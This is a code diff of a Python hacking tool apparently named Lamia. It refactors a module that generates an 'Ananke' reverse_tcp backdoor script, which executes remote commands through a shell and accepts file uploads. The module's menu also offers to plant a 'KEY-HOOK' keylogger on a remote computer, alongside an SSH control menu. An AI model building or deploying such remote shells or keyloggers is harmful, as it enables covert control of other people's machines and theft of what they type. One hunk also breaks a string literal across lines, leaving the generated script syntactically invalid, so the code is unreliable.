@@ -1,3 +1,7 @@
+"""
+This module will generate 'Anake' script that is used to create reverse_tcp connection
+between two computers.
+"""
 import os
 import socket
 from time import sleep
@@ -5,14 +9,15 @@ from typing import NoReturn
 
 import paramiko
 
-from .untils import clear_terminal, pause_script, Text
+from lamia.exceptions import InactiveHostError
+from .untils import clear_terminal, pause_script, TextColor
 from .user_information import UserDeviceInformation
 
 
 class RemoteControlModules(UserDeviceInformation):
     """
-    This module allows you to create reverse_tcp connection between two computers or connect
-    to device in other network using SSH.
+    This module allows you to create reverse_tcp connection between two computers or
+    connect to device in other network using SSH.
     """
 
     def __repr__(self) -> str:
@@ -26,12 +31,14 @@ class RemoteControlModules(UserDeviceInformation):
         print("-" * 70)
         print(
             f"This modules allows you to remotely connect to other computer.\n"
-            f"By using {Text.warning}SSH{Text.endc} or {Text.warning}ANANKE MODULE{Text.endc} "
+            f"By using {TextColor.WARNING}SSH{TextColor.ENDC} or {TextColor.WARNING}"
+            f"ANANKE MODULE{TextColor.ENDC} "
             f"you can execute command on remote\n"
-            f"computers as well as you can upload generated {Text.warning}KEY-HOOK\n"
-            f"to catch all symbols from keyboard connected with remote computer{Text.endc}."
+            f"computers as well as you can upload generated {TextColor.WARNING}"
+            f"KEY-HOOK\n to catch all symbols from keyboard connected with remote "
+            f"computer{TextColor.ENDC}."
         )
-        print(f"Do you want to continue {Text.warning}y/n{Text.endc}?")
+        print(f"Do you want to continue {TextColor.WARNING}y/n{TextColor.ENDC}?")
         print("-" * 70)
         remote_control_choice = str(input("> "))
         clear_terminal()
@@ -42,11 +49,13 @@ class RemoteControlModules(UserDeviceInformation):
 
     def remote_control_modules_menu(self) -> NoReturn:
         print(
-            25 * "-" + f"{Text.blue}REMOTE CONTROL MENU {Text.endc}" + 25 * "-"
+            25 * "-"
+            + f"{TextColor.BLUE}REMOTE CONTROL MENU {TextColor.ENDC}"
+            + 25 * "-"
         )
-        print(f"{Text.warning}1.SSH{Text.endc}")
-        print(f"{Text.warning}2.ANANKE{Text.endc}")
-        print(f"{Text.warning}0.BACK TO MAIN MENU{Text.endc}")
+        print(f"{TextColor.WARNING}1.SSH{TextColor.ENDC}")
+        print(f"{TextColor.WARNING}2.ANANKE{TextColor.ENDC}")
+        print(f"{TextColor.WARNING}0.BACK TO MAIN MENU{TextColor.ENDC}")
         print(70 * "-")
         remote_control_menu_choice = str(input("> "))
         if remote_control_menu_choice == "1":
@@ -66,12 +75,12 @@ class RemoteControlModules(UserDeviceInformation):
                 )
             except OSError:
                 print(
-                    f"{Text.error}ERROR!{Text.endc} I have problems with save!"
+                    f"{TextColor.ERROR}ERROR!{TextColor.ENDC} I have problems with save!"
                 )
                 sleep(2)
             clear_terminal()
-            with open(self.check_default_ananke, "w") as f:
-                f.write(
+            with open(self.check_default_ananke, "w", encoding="big5") as file:
+                file.write(
                     r"""
 # -*- coding: big5 -*-
 # !/opt/local/bin/python3
@@ -98,7 +107,8 @@ class Ananke:
         command = command.decode('utf8').rstrip()
 
         try:
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT,
+                                            shell=True)
         except:
             output = "Nie udalo się wykonac polecenia.\r\n"
 
@@ -118,9 +128,11 @@ class Ananke:
                 file_descriptor = open(self.upload_destination, "wb")
                 file_descriptor.write(file_buffer)
                 file_descriptor.close()
-                client_socket.send(("Zapisano plik w %s\r\n" % (self.upload_destination,)).encode('utf8'))
+                client_socket.send(("Zapisano plik w %s\r\n" %
+                                    (self.upload_destination,)).encode('utf8'))
             except:
-                client_socket.send(("Nie udalo się zapisac pliku w %s\r\n" % (self.upload_destination,)).encode('utf8'))
+                client_socket.send(("Nie udalo się zapisac pliku w
+                                    %s\r\n" % (self.upload_destination,)).encode('utf8'))
 
         if len(self.execute):
             output = self.run_command(self.execute)
@@ -150,7 +162,8 @@ class Ananke:
         while True:
             client_socket, addr = server.accept()
             print('Accepting %s from %s' % (client_socket, addr))
-            client_thread = threading.Thread(target=Ananke.client_handler, args=(self, client_socket,))
+            client_thread = threading.Thread(target=Ananke.client_handler,
+                                            args=(self, client_socket,))
             client_thread.start()
 
     def client_sender(self, buffer: str):
@@ -183,7 +196,7 @@ class Ananke:
             self.usage()
         try:
             opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
-                                       ["help", "listen", "execute", "target", "port", "command", "upload"])
+                         ["help", "listen", "execute", "target", "port", "command", "upload"])
         except getopt.GetoptError as err:
             self.usage()
         for o, a in opts:
@@ -245,12 +258,16 @@ if __name__ == '__main__':
                 )
             clear_terminal()
             print(
-                f"Script will save here: {Text.warning}{self.check_default_ananke}{Text.endc}"
+                f"Script will save here: {TextColor.WARNING}{self.check_default_ananke}"
+                f"{TextColor.ENDC}"
             )
             pause_script()
 
 
 class SSH:
+    """
+    Lamia SSH manger.
+    """
     def __repr__(self) -> str:
         return f"{self.__class__.__name__}"
 
@@ -260,34 +277,38 @@ class SSH:
         print(70 * "-")
         print(
             f"By Using this module you can connect to remote computer and control\n"
-            f"this computer using {Text.warning}SSH.{Text.endc}"
+            f"this computer using {TextColor.WARNING}SSH.{TextColor.ENDC}"
             f"\nOnce connected, you can execute the command on a remote computer.\n"
-            f"Do you want to connect {Text.warning}y/n{Text.endc}?"
+            f"Do you want to connect {TextColor.WARNING}y/n{TextColor.ENDC}?"
         )
         print(70 * "-")
         command_ssh: str = str(input("> "))
         if command_ssh.upper() == "Y":
             SSH().ssh_command()
         else:
-            print(f"{Text.error}WRONG OPTION!{Text.endc}")
+            print(f"{TextColor.ERROR}WRONG OPTION!{TextColor.ENDC}")
             sleep(2)
             SSH().shh_start_choice()
 
     @staticmethod
     def ssh_command() -> NoReturn:
+        """
+        Get necessary credentials from user to create SSH connection between two devices.
+        """
         clear_terminal()
-        print(30 * "-" + f"{Text.blue}SSH MODULE{Text.endc}" + 30 * "-")
+        print(30 * "-" + f"{TextColor.BLUE}SSH MODULE{TextColor.ENDC}" + 30 * "-")
         sleep(0.25)
         print(
-            f"After connection if you want to disconnect type {Text.warning}0{Text.endc}"
+            f"After connection if you want to disconnect type {TextColor.WARNING}0"
+            f"{TextColor.ENDC}"
         )
-        ip_ssh: str = str(input(f"Type {Text.warning}IP{Text.endc}: "))
+        ip_ssh: str = str(input(f"Type {TextColor.WARNING}IP{TextColor.ENDC}: "))
         port_ssh: str = str(
-            input(f"Type {Text.warning}Port number{Text.endc}: ")
+            input(f"Type {TextColor.WARNING}Port number{TextColor.ENDC}: ")
         )
-        login_shh: str = str(input(f"Type {Text.warning}Login{Text.endc}: "))
+        login_shh: str = str(input(f"Type {TextColor.WARNING}Login{TextColor.ENDC}: "))
         password_ssh: str = str(
-            input(f"Type {Text.warning}Password{Text.endc}: ")
+            input(f"Type {TextColor.WARNING}Password{TextColor.ENDC}: ")
         )
         clear_terminal()
         try:
@@ -308,18 +329,17 @@ class SSH:
                         ssh_session.exec_command(command_shh_connected)
                         print(ssh_session.recv(1024).decode("UTF-8"))
                     elif command_shh_connected == "0":
-                        if client:
-                            client.close()
-                            input(
-                                f"\n{Text.warning}Disconnecting ...{Text.endc}\nPress any key to continue ..."
-                            )
-                            break
+                        client.close()
+                        input(
+                            f"\n{TextColor.WARNING}Disconnecting ...{TextColor.ENDC}"
+                            f"\nPress any key to continue ..."
+                        )
+                        break
 
         except socket.gaierror:
-            print(f"{Text.error}Can't find host!{Text.endc}")
-            print(70 * "-")
+            InactiveHostError(ip_ssh)
         except paramiko.ssh_exception.AuthenticationException:
-            print(f"{Text.error}Wrong credentials!{Text.endc}")
+            print(f"{TextColor.ERROR}Wrong credentials!{TextColor.ENDC}")
             print(70 * "-")
         finally:
             ssh_again = str(input("Do you want to connect again y/n?: "))
